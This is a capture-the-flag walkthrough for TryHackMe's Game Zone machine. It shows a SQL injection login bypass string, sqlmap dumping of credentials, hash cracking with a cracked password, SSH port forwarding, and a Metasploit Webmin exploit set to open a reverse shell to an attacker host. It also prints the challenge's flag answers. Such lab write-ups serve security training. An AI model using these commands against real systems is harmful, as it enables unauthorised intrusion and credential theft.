## CTF: Game Zone (THM)

**Target IP:** `$target`

---

## Metadata

- **CTF Name:** Game Zone
    
- **Platform:** TryHackMe
    
- **Date:** 2026-03-23
    
- **Tools Used:** Burp Suite , sqlmap , John the Ripper , ssh , Metasploit
    
- **Key Skills:** SQL Injection (Auth Bypass) , Database Dumping , Hash Cracking (SHA256) , Local Port Forwarding , Remote Command Execution (RCE)
    

---

## Introduction

This walkthrough covers the exploitation of the **Game Zone** machine on TryHackMe. The attack chain involves bypassing a login portal via SQL injection, dumping administrative credentials with `sqlmap`, cracking hashes with `john`, and escalating privileges through an SSH tunnel to exploit a vulnerable internal Webmin instance.

### Key Skills/Tools

- **Tools:** `sqlmap` , `john` , `msfconsole` , `ssh` , `ss`.
    
- **Skills:** SQL Injection (Auth Bypass) , Database Dumping , Hash Cracking (SHA256) , Local Port Forwarding (SSH Tunneling) , Remote Command Execution (RCE).
    

---

## Reconnaissance

Initial identification of site assets and the forum's cartoon avatar.

- **Cartoon Avatar:** Agent 47.
    

---

## Foothold

Access to the portal was achieved by bypassing the login form using a SQL injection string in the username field while leaving the password blank.

**Login Payload:**

- **Username:** `' or 1=1 -- -`
    
- **Password:** (Leave blank)
    

---

## Credential Cracking

A search for 'test' was captured in Burp Suite and saved as `request.txt` to be processed by `sqlmap`.

### 1. SQL Injection (sqlmap)

**Command:**

Bash

```
😎 amuzed@Kali (~/THM/Game_Zone)
$ sqlmap -r request.txt --dbms=mysql --dump
```

**Extracted User Data:**

- **Username:** `agent47`
    
- **Hash:** `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`
    

### 2. Hash Cracking (John the Ripper)

The hash was identified as SHA256 and cracked using the `rockyou.txt` wordlist. Note that initial attempts without specifying the format resulted in generic warnings.

**Command:**

Bash

```
😎 amuzed@Kali (~/THM/Game_Zone)
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256
```

- **Cracked Password:** `videogamer124`
    

---

## Lateral Movement

Using the cracked credentials, access was established via SSH to the target machine.

**Command:**

Bash

```
😎 amuzed@Kali (~/THM/Game_Zone)
$ ssh agent47@$target
```

### Internal Enumeration

Checking for local listening ports revealed a service on port `10000` bound to `127.0.0.1`. **Command:**

Bash

```
agent47@gamezone:~$ ss -tulpn
```

---

## Privilege Escalation

### 1. SSH Tunneling

To access the internal Webmin service, a local port forward was established. **Command:**

Bash

```
😎 amuzed@Kali (~/THM/Game_Zone)
$ ssh -L 10000:localhost:10000 agent47@$target
```

### 2. Webmin Exploitation (Metasploit)

The version was identified as **Webmin 1.580**, which is vulnerable to Remote Command Execution.

**Metasploit Commands:**

Code snippet

```
msf > search webmin 1.580
msf > use exploit/unix/webapp/webmin_show_cgi_exec
msf exploit(unix/webapp/webmin_show_cgi_exec) > set password videogamer124
msf exploit(unix/webapp/webmin_show_cgi_exec) > set username agent47
msf exploit(unix/webapp/webmin_show_cgi_exec) > set ssl false
msf exploit(unix/webapp/webmin_show_cgi_exec) > set rhost 127.0.0.1
msf exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/unix/reverse
msf exploit(unix/webapp/webmin_show_cgi_exec) > set lhost 192.168.230.58
msf exploit(unix/webapp/webmin_show_cgi_exec) > run
```

---

## Flags

- **User.txt:** `649ac17b1480ac13ef1e4fa579dac95c`
    
- **Root.txt:** `a4b945830144bdd71908d12d902adeee`
